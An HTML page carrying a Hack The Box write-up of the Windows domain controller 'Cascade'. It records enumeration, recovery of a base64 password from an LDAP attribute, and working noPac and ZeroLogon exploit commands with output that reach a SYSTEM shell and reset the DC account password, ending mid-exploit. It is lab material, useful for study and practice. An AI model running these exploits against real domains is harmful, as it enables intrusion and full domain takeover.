@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Cascade | Paracausal Telemetry</title><meta name="description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), LDAP (389)." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-cascade/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Cascade" /><meta property="og:description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), LDAP (389)." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-cascade/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-cascade/og.png?v=1a6e1c6c" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Cascade" /><meta name="twitter:description" content="Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), LDAP (389)." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-cascade/og.png?v=1a6e1c6c" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Cascade","description":"Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), LDAP (389).","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-cascade/","datePublished":"2026-04-12","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Cascade","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-cascade/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Cascade</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-12 · 9 min read</p><h1>Cascade</h1><p>Medium Hack The Box Active Directory machine, written up by Ethan Bauer. Covers SMB (445), LDAP (389).</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · medium</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Cascade" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-cascade.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-cascade.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Cascade</h2><p>Cascade is a medium difficulty Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user r.thompson, which gives access to a TightVNC registry backup. The backup is decrypted to gain the password for…</p></div><span class="room-badge room-badge-medium">Medium</span></div><dl class="room-facts"><div><dt>Released</dt><dd>28 Mar 2020</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creator</dt><dd>VbScrub</dd></div><div><dt>Rating</dt><dd>4.6 / 5</dd></div><div><dt>User owns</dt><dd>12,319</dd></div><div><dt>Root owns</dt><dd>11,042</dd></div><div><dt>User blood</dt><dd>qtc<small class="room-blood-time">0H 41M 43S</small></dd></div><div><dt>Root blood</dt><dd>jkr<small class="room-blood-time">1H 5M 7S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 16148 votes from easiest to hardest"><rect x="0" y="60" width="20" height="4" rx="2" fill="hsl(96 70% 55%)"><title>329 votes</title></rect><rect x="26" y="60" width="20" height="4" rx="2" fill="hsl(96 70% 55%)"><title>383 votes</title></rect><rect x="52" y="44" width="20" height="20" rx="2" fill="hsl(80 70% 55%)"><title>1736 votes</title></rect><rect x="78" y="27" width="20" height="37" rx="2" fill="hsl(70 70% 55%)"><title>3161 votes</title></rect><rect x="104" y="0" width="20" height="64" rx="2" fill="hsl(50 70% 55%)"><title>5529 votes</title></rect><rect x="130" y="38" width="20" height="26" rx="2" fill="hsl(38 70% 55%)"><title>2236 votes</title></rect><rect x="156" y="46" width="20" height="18" rx="2" fill="hsl(28 70% 55%)"><title>1545 votes</title></rect><rect x="182" y="56" width="20" height="8" rx="2" fill="hsl(16 70% 55%)"><title>696 votes</title></rect><rect x="208" y="61" width="20" height="3" rx="2" fill="hsl(8 70% 55%)"><title>256 votes</title></rect><rect x="234" y="61" width="20" height="3" rx="2" fill="hsl(0 70% 55%)"><title>277 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 8.0, Real-Life 6.5, CVE 4.4, Custom Exploitation 5.6, CTF-Like 3.5"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,54.0 153.3,95.9 128.1,134.9 87.0,141.7 86.7,102.4" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Cascade" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.18.9 --generate-hosts-file /etc/hosts  
+[sudo] password for kali: 
+SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><ul><li>SMB signing is enabled</li><li>Null auth enabled</li></ul><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT -Pn casc-dc1.cascade.local
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 17:11 +0100
+Nmap scan report for casc-dc1.cascade.local (10.129.18.9)
+Host is up (0.013s latency).
+rDNS record for 10.129.18.9: CASC-DC1.cascade.local
+Not shown: 65520 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49168/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.70 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,88,135,139,389,445,636,3268,3269,5985 -A --min-rate=2000 -sT -Pn casc-dc1.cascade.local                      
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 17:13 +0100
+Nmap scan report for casc-dc1.cascade.local (10.129.18.9)
+Host is up (0.014s latency).
+rDNS record for 10.129.18.9: CASC-DC1.cascade.local
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-12 16:13:53Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
+Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</code></pre><h2>SMB (445)</h2><h3>Null auth</h3><h4>Users</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb casc-dc1.cascade.local -u &#39;&#39; -p &#39;&#39; --users-export users.txt
+SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\: 
+SMB         10.129.18.9     445    CASC-DC1         -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB         10.129.18.9     445    CASC-DC1         CascGuest                     &lt;never&gt;             0       Built-in account for guest access to the computer/domain 
+SMB         10.129.18.9     445    CASC-DC1         arksvc                        2020-01-09 16:18:20 0        
+SMB         10.129.18.9     445    CASC-DC1         s.smith                       2020-01-28 19:58:05 0        
+SMB         10.129.18.9     445    CASC-DC1         r.thompson                    2020-01-09 19:31:26 0        
+SMB         10.129.18.9     445    CASC-DC1         util                          2020-01-13 02:07:11 0        
+SMB         10.129.18.9     445    CASC-DC1         j.wakefield                   2020-01-09 20:34:44 0        
+SMB         10.129.18.9     445    CASC-DC1         s.hickson                     2020-01-13 01:24:27 0        
+SMB         10.129.18.9     445    CASC-DC1         j.goodhand                    2020-01-13 01:40:26 0        
+SMB         10.129.18.9     445    CASC-DC1         a.turnbull                    2020-01-13 01:43:13 0        
+SMB         10.129.18.9     445    CASC-DC1         e.crowe                       2020-01-13 03:45:02 0        
+SMB         10.129.18.9     445    CASC-DC1         b.hanson                      2020-01-13 16:35:39 0        
+SMB         10.129.18.9     445    CASC-DC1         d.burman                      2020-01-13 16:36:12 0        
+SMB         10.129.18.9     445    CASC-DC1         BackupSvc                     2020-01-13 16:37:03 0        
+SMB         10.129.18.9     445    CASC-DC1         j.allen                       2020-01-13 17:23:59 0        
+SMB         10.129.18.9     445    CASC-DC1         i.croft                       2020-01-15 21:46:21 0        
+SMB         10.129.18.9     445    CASC-DC1         [*] Enumerated 15 local users: CASCADE
+SMB         10.129.18.9     445    CASC-DC1         [*] Writing 15 local users to users.txt</code></pre><h4>Shares</h4><p>Cannot list shares using null authentication</p><h4>Rid brute</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb casc-dc1.cascade.local -u &#39;&#39; -p &#39;&#39; --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 &gt; users.txt</code></pre><p>Since rid brute tends to be more accurate i will run this as well and cut the output and replace the contents of the user file</p><p>This has given me three extra users!</p><p>The guest account is called <code>CascGuest</code> on this domain but this account is disabled so no help here</p><h2>LDAP (389)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap casc-dc1.cascade.local -u &#39;&#39; -p &#39;&#39; --query &quot;(sAMAccountName=r.thompson)&quot; &quot;&quot;   
+
+LDAP        10.129.18.9     389    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 (name:CASC-DC1) (domain:cascade.local) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.18.9     389    CASC-DC1         [+] cascade.local\: 
+LDAP        10.129.18.9     389    CASC-DC1         [+] Response for object: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+LDAP        10.129.18.9     389    CASC-DC1         objectClass          top
+LDAP        10.129.18.9     389    CASC-DC1                              person
+LDAP        10.129.18.9     389    CASC-DC1                              organizationalPerson
+LDAP        10.129.18.9     389    CASC-DC1                              user
+LDAP        10.129.18.9     389    CASC-DC1         cn                   Ryan Thompson
+LDAP        10.129.18.9     389    CASC-DC1         sn                   Thompson
+LDAP        10.129.18.9     389    CASC-DC1         givenName            Ryan
+LDAP        10.129.18.9     389    CASC-DC1         distinguishedName    CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
+LDAP        10.129.18.9     389    CASC-DC1         instanceType         4
+LDAP        10.129.18.9     389    CASC-DC1         whenCreated          20200109193126.0Z
+LDAP        10.129.18.9     389    CASC-DC1         whenChanged          20200323112031.0Z
+LDAP        10.129.18.9     389    CASC-DC1         displayName          Ryan Thompson
+LDAP        10.129.18.9     389    CASC-DC1         uSNCreated           24610
+LDAP        10.129.18.9     389    CASC-DC1         memberOf             CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
+LDAP        10.129.18.9     389    CASC-DC1         uSNChanged           295010
+LDAP        10.129.18.9     389    CASC-DC1         name                 Ryan Thompson
+LDAP        10.129.18.9     389    CASC-DC1         objectGUID           2dfa43ea-a9e0-524b-a913-2f5b1570418c
+LDAP        10.129.18.9     389    CASC-DC1         userAccountControl   66048
+LDAP        10.129.18.9     389    CASC-DC1         badPwdCount          36
+LDAP        10.129.18.9     389    CASC-DC1         codePage             0
+LDAP        10.129.18.9     389    CASC-DC1         countryCode          0
+LDAP        10.129.18.9     389    CASC-DC1         badPasswordTime      134204850389451552
+LDAP        10.129.18.9     389    CASC-DC1         lastLogoff           0
+LDAP        10.129.18.9     389    CASC-DC1         lastLogon            132247339125713230
+LDAP        10.129.18.9     389    CASC-DC1         pwdLastSet           132230718862636251
+LDAP        10.129.18.9     389    CASC-DC1         primaryGroupID       513
+LDAP        10.129.18.9     389    CASC-DC1         objectSid            S-1-5-21-3332504370-1206983947-1165150453-1109
+LDAP        10.129.18.9     389    CASC-DC1         accountExpires       9223372036854775807
+LDAP        10.129.18.9     389    CASC-DC1         logonCount           2
+LDAP        10.129.18.9     389    CASC-DC1         sAMAccountName       r.thompson
+LDAP        10.129.18.9     389    CASC-DC1         sAMAccountType       805306368
+LDAP        10.129.18.9     389    CASC-DC1         userPrincipalName    r.thompson@cascade.local
+LDAP        10.129.18.9     389    CASC-DC1         objectCategory       CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
+LDAP        10.129.18.9     389    CASC-DC1         dSCorePropagationData 20200126183918.0Z
+LDAP        10.129.18.9     389    CASC-DC1                              20200119174753.0Z
+LDAP        10.129.18.9     389    CASC-DC1                              20200119174719.0Z
+LDAP        10.129.18.9     389    CASC-DC1                              20200119174508.0Z
+LDAP        10.129.18.9     389    CASC-DC1                              16010101000000.0Z
+LDAP        10.129.18.9     389    CASC-DC1         lastLogonTimestamp   132294360317419816
+LDAP        10.129.18.9     389    CASC-DC1         msDS-SupportedEncryptionTypes 0
+LDAP        10.129.18.9     389    CASC-DC1         cascadeLegacyPwd     clk0bjVldmE=</code></pre><p>After querying several different users on the domain i try this one and find credentials</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">echo &#39;clk0bjVldmE=&#39; | base64 -d                                                
+rY4n5eva</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">r.thompson:rY4n5eva</code></pre><p>After base64 decoding it i get his password</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb casc-dc1.cascade.local -u &#39;r.thompson&#39; -p &#39;rY4n5eva&#39;       
+SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva</code></pre><p>This user is compromised</p><h2>Domain admin (Unintendeds)</h2><h3>NoPac</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb casc-dc1.cascade.local -u &#39;r.thompson&#39; -p &#39;rY4n5eva&#39; -M nopac               
+SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+NOPAC       10.129.18.9     445    CASC-DC1         TGT with PAC size 1487
+NOPAC       10.129.18.9     445    CASC-DC1         TGT without PAC size 722
+NOPAC       10.129.18.9     445    CASC-DC1         
+NOPAC       10.129.18.9     445    CASC-DC1         VULNERABLE
+NOPAC       10.129.18.9     445    CASC-DC1         Next step: https://github.com/Ridter/noPac</code></pre><p>It is vulnerable to NoPac i knew to test for this based on past experience with a similar version of windows</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 noPac.py cascade.local/r.thompson:&#39;rY4n5eva&#39; -dc-ip 10.129.18.9 -dc-host casc-dc1 -shell --impersonate administrator -use-ldap
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+    
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Selected Target CASC-DC1.cascade.local
+[*] will try to impersonate administrator
+[*] Adding Computer Account &quot;WIN-RRNTVQP3YBF$&quot;
+[*] MachineAccount &quot;WIN-RRNTVQP3YBF$&quot; password = rOa2XRkHugC#
+[*] Successfully added machine account WIN-RRNTVQP3YBF$ with password rOa2XRkHugC#.
+[*] WIN-RRNTVQP3YBF$ object = CN=WIN-RRNTVQP3YBF,CN=Computers,DC=cascade,DC=local
+[*] WIN-RRNTVQP3YBF$ sAMAccountName == CASC-DC1
+[*] Saving a DC&#39;s ticket in CASC-DC1.ccache
+[*] Reseting the machine account to WIN-RRNTVQP3YBF$
+[*] Restored WIN-RRNTVQP3YBF$ sAMAccountName to original value
+[*] Using TGT from cache
+[*] Impersonating administrator
+[*] 	Requesting S4U2self
+[*] Saving a user&#39;s ticket in administrator.ccache
+[*] Rename ccache to administrator_CASC-DC1.cascade.local.ccache
+[*] Attempting to del a computer with the name: WIN-RRNTVQP3YBF$
+[-] Delete computer WIN-RRNTVQP3YBF$ Failed! Maybe the current user does not have permission.
+[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
+[*] Exploiting..
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32&gt;whoami
+nt authority\system
+
+C:\Windows\system32&gt;whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                  Description                               State   
+=============================== ========================================= ========
+SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
+SeLockMemoryPrivilege           Lock pages in memory                      Enabled 
+SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
+SeTcbPrivilege                  Act as part of the operating system       Enabled 
+SeSecurityPrivilege             Manage auditing and security log          Disabled
+SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
+SeLoadDriverPrivilege           Load and unload device drivers            Disabled
+SeSystemProfilePrivilege        Profile system performance                Enabled 
+SeSystemtimePrivilege           Change the system time                    Disabled
+SeProfileSingleProcessPrivilege Profile single process                    Enabled 
+SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
+SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
+SeCreatePermanentPrivilege      Create permanent shared objects           Enabled 
+SeBackupPrivilege               Back up files and directories             Disabled
+SeRestorePrivilege              Restore files and directories             Disabled
+SeShutdownPrivilege             Shut down the system                      Disabled
+SeDebugPrivilege                Debug programs                            Enabled 
+SeAuditPrivilege                Generate security audits                  Enabled 
+SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
+SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
+SeUndockPrivilege               Remove computer from docking station      Disabled
+SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
+SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege         Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled 
+SeTimeZonePrivilege             Change the time zone                      Enabled 
+SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled 
+
+C:\Windows\system32&gt;</code></pre><p>Domain admin!</p><h3>ZeroLogon</h3><p>Past experience also tells me this version can be vulnerable to zerologon</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb casc-dc1.cascade.local -u &#39;r.thompson&#39; -p &#39;rY4n5eva&#39; -M zerologon
+SMB         10.129.18.9     445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.18.9     445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
+ZEROLOGON   10.129.18.9     445    CASC-DC1         VULNERABLE
+ZEROLOGON   10.129.18.9     445    CASC-DC1         Next step: https://github.com/dirkjanm/CVE-2020-1472</code></pre><p>It is indeed vulnerable</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 cve-2020-1472-exploit.py casc-dc1 10.129.18.9 
+Performing authentication attempts...
+========================================================================================================================================================================================================================================================================================================================================================================================================
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
